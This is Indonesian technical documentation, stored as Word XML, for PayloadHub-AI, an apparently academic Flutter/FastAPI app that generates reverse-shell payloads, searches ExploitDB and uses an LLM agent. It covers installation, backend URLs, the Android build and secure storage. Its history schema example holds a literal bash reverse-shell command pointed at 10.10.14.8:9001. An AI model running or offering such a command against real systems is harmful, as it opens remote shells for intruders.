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Dokumentasi Teknis — PayloadHub-AI</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Versi aplikasi:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> 1.0.0+1</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Terakhir diperbarui:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> 23 Oktober 2026</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Audiens:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> pengembang, dosen pembimbing, dan penguji teknis.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>Dokumen ini menjelaskan cara memasang, menjalankan, membangun, dan</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>memelihara PayloadHub-AI. Laporan tahapan proyek ada di</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:color w:val="1A4F8B"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t>`Tahap-1`</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="666666"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve"> (Tahap-1-Analisis-Kebutuhan.md)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> hingga</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:color w:val="1A4F8B"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t>`Tahap-5`</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="666666"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve"> (Tahap-5-Laporan-Akhir.md)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>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1. Gambaran Sistem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┌──────────────────────────── Flutter client ────────────────────────────┐</w:t>
        <w:br/>
        <w:t>│ Presentation : DashboardScreen, HistoryScreen, Settings, Exploit, ...  │</w:t>
        <w:br/>
        <w:t>│ State        : Riverpod StateNotifier / Provider                        │</w:t>
        <w:br/>
        <w:t>│ Domain       : ActivityEntry, ChatMessage, dashboard models             │</w:t>
        <w:br/>
        <w:t>│ Data         : SecureActivityRepository, PayloadRepositoryImpl,         │</w:t>
        <w:br/>
        <w:t>│                ThreatIntelService                                       │</w:t>
        <w:br/>
        <w:t>│ Services     : SecureStorageService, DioClient, FreeChatbotService      │</w:t>
        <w:br/>
        <w:t>└───────────────────────────────┬────────────────────────────────────────┘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   │ HTTP/JSON (Dio)</w:t>
        <w:br/>
        <w:t xml:space="preserve">                                ▼</w:t>
        <w:br/>
        <w:t>┌──────────────────────────── FastAPI backend ───────────────────────────┐</w:t>
        <w:br/>
        <w:t>│ /healthz                                                               │</w:t>
        <w:br/>
        <w:t>│ /api/v1/agent/execute        → AgentExecutor + deterministic tools     │</w:t>
        <w:br/>
        <w:t>│ /api/v1/exploitdb/search     → katalog ExploitDB                       │</w:t>
        <w:br/>
        <w:t>│ /api/v1/virustotal/*         → status, scan, analysis, lookup          │</w:t>
        <w:br/>
        <w:t>│ Validasi Pydantic + sanitasi teks + guardrail etika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 w:val="0"/>
        </w:rPr>
        <w:t>Prinsip desain:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Deterministik lebih dulu.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> Payload one-liner dibuat di klien tanpa</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>memanggil LLM, sehingga tetap berfungsi saat backend mati.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Validasi berlapis.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> Klien memvalidasi IPv4/port; server memvalidasi</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>ulang dengan Pydantic.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Rahasia tidak pernah di bundle.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> API key dimasukkan pengguna dan</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>disimpan di secure storage.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Kegagalan tidak mematikan aplikasi.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> Data riwayat rusak diabaikan,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>error jaringan dipetakan menjadi pesan manusia.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="142B45"/>
        </w:rPr>
        <w:t>2. Struktur Direktori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frontend/</w:t>
        <w:br/>
        <w:t>├── lib/</w:t>
        <w:br/>
        <w:t>│   ├── main.dart</w:t>
        <w:br/>
        <w:t>│   ├── core/</w:t>
        <w:br/>
        <w:t>│   │   ├── error/app_exception.dart      # pemetaan error jaringan/API</w:t>
        <w:br/>
        <w:t>│   │   ├── network/dio_client.dart       # konfigurasi Dio + timeout</w:t>
        <w:br/>
        <w:t>│   │   ├── theme/app_theme.dart          # warna, tipografi, Material 3</w:t>
        <w:br/>
        <w:t>│   │   └── utils/validators.dart         # IPv4, port, pesan error</w:t>
        <w:br/>
        <w:t>│   ├── features/</w:t>
        <w:br/>
        <w:t>│   │   ├── dashboard/</w:t>
        <w:br/>
        <w:t>│   │   │   ├── data/threat_intel_service.dart</w:t>
        <w:br/>
        <w:t>│   │   │   ├── domain/models/            # dashboard_models, exploit_models</w:t>
        <w:br/>
        <w:t>│   │   │   └── presentation/</w:t>
        <w:br/>
        <w:t>│   │   │       ├── dashboard_providers.dart</w:t>
        <w:br/>
        <w:t>│   │   │       ├── dashboard_screen.dart</w:t>
        <w:br/>
        <w:t>│   │   │       ├── controllers/          # navigation, generator, studio, ...</w:t>
        <w:br/>
        <w:t>│   │   │       └── widgets/              # panel, halaman, top bar, sidebar</w:t>
        <w:br/>
        <w:t>│   │   ├── history/</w:t>
        <w:br/>
        <w:t>│   │   │   ├── domain/activity_entry.dart</w:t>
        <w:br/>
        <w:t>│   │   │   ├── data/activity_repository.dart</w:t>
        <w:br/>
        <w:t>│   │   │   └── presentation/             # controller, providers, screen</w:t>
        <w:br/>
        <w:t>│   │   └── payload_chat/                 # entity, repository, model API</w:t>
        <w:br/>
        <w:t>│   └── services/</w:t>
        <w:br/>
        <w:t>│       ├── secure_storage_service.dart</w:t>
        <w:br/>
        <w:t>│       ├── free_chatbot_service.dart</w:t>
        <w:br/>
        <w:t>│       └── auto_key_loader.dart</w:t>
        <w:br/>
        <w:t>├── test/                                 # 16 pengujian otomatis</w:t>
        <w:br/>
        <w:t>└── android/                              # manifest + Gradle</w:t>
        <w:br/>
        <w:t>backend/</w:t>
        <w:br/>
        <w:t>└── app/                                  # main, models, agent, tools, ...</w:t>
        <w:br/>
        <w:t>docs/                                     # laporan + aset</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="142B45"/>
        </w:rPr>
        <w:t>3. Prasyarat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Komponen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Versi yang diuji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Catatan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Flutter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3.47.2 stable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--version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3.13.2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Mengikuti Flutter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JDK untuk Android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OpenJDK 20.0.2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JDK 25 gagal dengan Gradle 8.14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Android SDK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36.0.0, Build-Tools 35.0.0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Platform 36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Gradle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8.14.3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android/gradle/wrapper/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Android Gradle Plugin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8.11.1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android/settings.gradle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Kotlin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2.2.20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Minimum Flutter 3.47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Python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3.10+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Node.js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diperlukan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</w:tbl>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>Konfigurasi JDK Flutter pada mesin build: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config --jdk-dir="C:\Program Files\Java\jdk-20"</w:t>
        <w:br/>
        <w:t>flutter doctor -v</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="142B45"/>
        </w:rPr>
        <w:t>4. Instalasi</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="142B45"/>
        </w:rPr>
        <w:t>4.1 Backend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cd backend</w:t>
        <w:br/>
        <w:t>python -m venv .venv</w:t>
        <w:br/>
        <w:t>.venv\Scripts\Activate.ps1</w:t>
        <w:br/>
        <w:t>python -m pip install --upgrade pip</w:t>
        <w:br/>
        <w:t>python -m pip install -r requirements.txt</w:t>
        <w:br/>
        <w:t>Copy-Item .env.example .env</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Isi </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="9C270B"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>backend/.env</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>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LLM_API_KEY=isi_key_anda</w:t>
        <w:br/>
        <w:t>LLM_BASE_URL=https://api.deepseek.com</w:t>
        <w:br/>
        <w:t>LLM_MODEL=deepseek-chat</w:t>
        <w:br/>
        <w:t>LLM_TEMPERATURE=0.0</w:t>
        <w:br/>
        <w:t>VIRUSTOTAL_API_KEY=</w:t>
        <w:br/>
        <w:t>CORS_ALLOW_ORIGINS=http://localhost:3000,http://localhost:8080</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>Jalankan: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uvicorn app.main:app --reload --host 0.0.0.0 --port 8000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>Verifikasi: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curl http://127.0.0.1:8000/healthz</w:t>
        <w:br/>
        <w:t># {"status":"ok"}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="142B45"/>
        </w:rPr>
        <w:t>4.2 Frontend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cd frontend</w:t>
        <w:br/>
        <w:t>flutter pub get</w:t>
        <w:br/>
        <w:t>flutter analyze</w:t>
        <w:br/>
        <w:t>flutter test</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>Menjalankan pada target yang tersedia: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devices</w:t>
        <w:br/>
        <w:t>flutter run -d windows</w:t>
        <w:br/>
        <w:t>flutter run -d chrome</w:t>
        <w:br/>
        <w:t>flutter run -d emulator-5554</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="142B45"/>
        </w:rPr>
        <w:t>5. Konfigurasi URL Backend</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="9C270B"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>defaultBaseUrl</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> ditentukan di</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="9C270B"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>lib/features/dashboard/presentation/dashboard_providers.dart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Target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URL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Windows, Linux, macOS, Web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http://localhost:8000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Emulator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http://10.0.2.2:8000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fisik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IP LAN komputer, mis. </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="9C270B"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>http://192.168.1.10:8000</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>Untuk perangkat fisik:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Jalankan backend dengan </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="9C270B"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>--host 0.0.0.0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Izinkan port 8000 pada firewall.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Ubah </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="9C270B"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>defaultBaseUrl</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> atau simpan URL kustom melalui Settings.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Untuk produksi gunakan HTTPS dan hapus </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="9C270B"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>usesCleartextTraffic</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="60"/>
        <w:ind w:left="360"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:i/>
          <w:color w:val="444444"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>usesCleartextTraffic="true"</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:color w:val="444444"/>
        </w:rPr>
        <w:t xml:space="preserve"> hanya untuk lab lokal. Jangan dipakai pada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distribusi publik.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="142B45"/>
        </w:rPr>
        <w:t>6. Build Android</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="142B45"/>
        </w:rPr>
        <w:t>6.1 Perintah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cd frontend</w:t>
        <w:br/>
        <w:t>flutter clean          # opsional bila build cache bermasalah</w:t>
        <w:br/>
        <w:t>flutter pub get</w:t>
        <w:br/>
        <w:t>flutter analyze</w:t>
        <w:br/>
        <w:t>flutter test</w:t>
        <w:br/>
        <w:t>flutter build apk --release</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>Keluaran: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build/app/outputs/flutter-apk/app-release.apk</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>Build final yang tercatat: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Atribut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Ukuran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57.876.933 byte (55,2 MB)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SHA-256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7F71676147E77EA323B26D172C99F7BA30C3CF7C0B6252E06263EFDAB15B1479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applicationId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id.farrel.payloadhubai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minSdk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targetSdk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36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Izin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INTERNET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6.2 Konfigurasi Gradle</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="9C270B"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>android/gradle/wrapper/gradle-wrapper.properties</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>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distributionUrl=https\://services.gradle.org/distributions/gradle-8.14.3-all.zip</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="9C270B"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>android/settings.gradle</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>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plugins {</w:t>
        <w:br/>
        <w:t xml:space="preserve">    id "dev.flutter.flutter-plugin-loader" version "1.0.0"</w:t>
        <w:br/>
        <w:t xml:space="preserve">    id "com.android.application" version "8.11.1" apply false</w:t>
        <w:br/>
        <w:t xml:space="preserve">    id "org.jetbrains.kotlin.android" version "2.2.20" apply false</w:t>
        <w:br/>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="9C270B"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>android/app/build.gradle</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>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android {</w:t>
        <w:br/>
        <w:t xml:space="preserve">    namespace = "id.farrel.payloadhubai"</w:t>
        <w:br/>
        <w:t xml:space="preserve">    compileSdk = flutter.compileSdkVersion</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    defaultConfig {</w:t>
        <w:br/>
        <w:t xml:space="preserve">        applicationId = "id.farrel.payloadhubai"</w:t>
        <w:br/>
        <w:t xml:space="preserve">        minSdk = 21</w:t>
        <w:br/>
        <w:t xml:space="preserve">        targetSdk = flutter.targetSdkVersion</w:t>
        <w:br/>
        <w:t xml:space="preserve">        versionCode = flutter.versionCode</w:t>
        <w:br/>
        <w:t xml:space="preserve">        versionName = flutter.versionName</w:t>
        <w:br/>
        <w:t xml:space="preserve">    }</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    buildTypes {</w:t>
        <w:br/>
        <w:t xml:space="preserve">        release {</w:t>
        <w:br/>
        <w:t xml:space="preserve">            signingConfig = signingConfigs.debug</w:t>
        <w:br/>
        <w:t xml:space="preserve">        }</w:t>
        <w:br/>
        <w:t xml:space="preserve">    }</w:t>
        <w:br/>
        <w:t>}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APK saat ini ditandatangani debug key. Untuk distribusi publik, buat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 xml:space="preserve">keystore rilis dan </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:i/>
          <w:color w:val="444444"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>key.properties</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:color w:val="444444"/>
        </w:rPr>
        <w:t xml:space="preserve"> (jangan commit).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="142B45"/>
        </w:rPr>
        <w:t>6.3 Troubleshooting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Gejala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Penyebab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Solusi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Gradle version 8.3.0 is lower than minimum 8.14.0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Wrapper usang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Naikkan </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="9C270B"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>distributionUrl</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t xml:space="preserve"> ke 8.14.3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Kotlin version 2.1.0 is lower than minimum 2.2.20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KGP usang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Set Kotlin 2.2.20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Unsupported class file major version 69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JDK 25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Pakai JDK 20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Starting AGP 9+ ...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AGP/DSL tidak cocok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Gunakan AGP 8.11.1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lambat/kehabisan RAM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Gradle daemon + IDE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Tutup aplikasi berat; </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="9C270B"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>gradle.properties</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t xml:space="preserve"> memakai memori terbatas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7. Penyimpanan Lokal</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="9C270B"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>SecureStorageService</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> membungkus </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="9C270B"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>FlutterSecureStorage</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> dengan</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="9C270B"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>AndroidOptions(encryptedSharedPreferences: true)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Key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Isi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Sensitif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llm_api_key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API key LLM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default_lhost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default_lport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Prefill generator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backend_base_url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URL backend kustom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api_openai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api_deepseek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api_gemini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api_shodan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api_virustotal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Key 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llm_engine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Pilihan engine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ui_glow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ui_terminal_font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ui_sound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Preferensi UI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activity_log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JSON array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 (berisi payload)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free_chat_provider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free_chat_api_key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Chatbot informasional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7.1 Skema riwayat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[</w:t>
        <w:br/>
        <w:t xml:space="preserve">  {</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "id": "1729684800000000-payload",</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "kind": "payload",</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "title": "Reverse Shell — bash",</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "detail": "bash -i &gt;&amp; /dev/tcp/10.10.14.8/9001 0&gt;&amp;1",</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "createdAt": "2026-10-23T22:00:00.000"</w:t>
        <w:br/>
        <w:t xml:space="preserve">  }</w:t>
        <w:br/>
        <w:t>]</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>Aturan: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kind</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> ∈ </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="9C270B"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>payload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exploit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scan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threat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chat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Maksimum </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>40 entri</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>; entri tertua dibuang otomatis.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Urutan menurun berdasarkan </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="9C270B"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>createdAt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Entri tidak valid dilewati saat pemuatan; JSON rusak menghasilkan daftar</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>kosong, bukan crash.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>Ekspor menghasilkan JSON yang disalin ke clipboard.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="142B45"/>
        </w:rPr>
        <w:t>8. Alur Data Utama</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="142B45"/>
        </w:rPr>
        <w:t>8.1 Generate payload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ScriptGeneratorPage</w:t>
        <w:br/>
        <w:t xml:space="preserve">  → Form.validate() (validators.dart)</w:t>
        <w:br/>
        <w:t xml:space="preserve">  → ScriptGeneratorController.generate()</w:t>
        <w:br/>
        <w:t xml:space="preserve">      → PayloadLibrary (deterministik)</w:t>
        <w:br/>
        <w:t xml:space="preserve">      → HistoryController.add(ActivityEntry)</w:t>
        <w:br/>
        <w:t xml:space="preserve">          → SecureActivityRepository.save()</w:t>
        <w:br/>
        <w:t xml:space="preserve">              → SecureStorageService.writeActivityLog()</w:t>
        <w:br/>
        <w:t xml:space="preserve">  → UI menampilkan kode + SnackBar + panel riwayat</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="142B45"/>
        </w:rPr>
        <w:t>8.2 Panggilan agent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FreeChatController / Studio</w:t>
        <w:br/>
        <w:t xml:space="preserve">  → PayloadRepositoryImpl.execute()</w:t>
        <w:br/>
        <w:t xml:space="preserve">      → DioClient.post('/api/v1/agent/execute')</w:t>
        <w:br/>
        <w:t xml:space="preserve">          → Pydantic validation</w:t>
        <w:br/>
        <w:t xml:space="preserve">          → AgentExecutor (LLM + tools)</w:t>
        <w:br/>
        <w:t xml:space="preserve">      ← AgentResponse { response, code_blocks, tools_used, elapsed_ms }</w:t>
        <w:br/>
        <w:t xml:space="preserve">  → UI merender jawaban + blok kode</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="142B45"/>
        </w:rPr>
        <w:t>8.3 Riwayat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HistoryController (StateNotifier&lt;List&lt;ActivityEntry&gt;&gt;)</w:t>
        <w:br/>
        <w:t xml:space="preserve">  ├── load()   → repository.load()</w:t>
        <w:br/>
        <w:t xml:space="preserve">  ├── add()    → insert(0) + trim(40) + persist</w:t>
        <w:br/>
        <w:t xml:space="preserve">  ├── remove() → filter + persist</w:t>
        <w:br/>
        <w:t xml:space="preserve">  ├── clear()  → [] + persist</w:t>
        <w:br/>
        <w:t xml:space="preserve">  └── export() → jsonEncode + Clipboard</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
